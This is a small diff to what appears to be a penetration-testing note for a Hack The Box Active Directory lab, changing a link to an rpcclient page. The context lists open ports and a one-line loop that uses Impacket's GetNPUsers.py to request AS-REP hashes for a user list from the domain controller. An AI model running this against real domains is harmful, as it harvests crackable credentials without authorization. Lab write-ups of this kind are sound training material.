@@ -5,7 +5,7 @@
 - 137 open
 - 3268 and 3269 open
 - LDAP: 389 and 636
-- [[rpcclient]]
+- [RPCClient](../Tools/rpcclient.md)
 
 #### Try to get some user hashes
 `for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done`
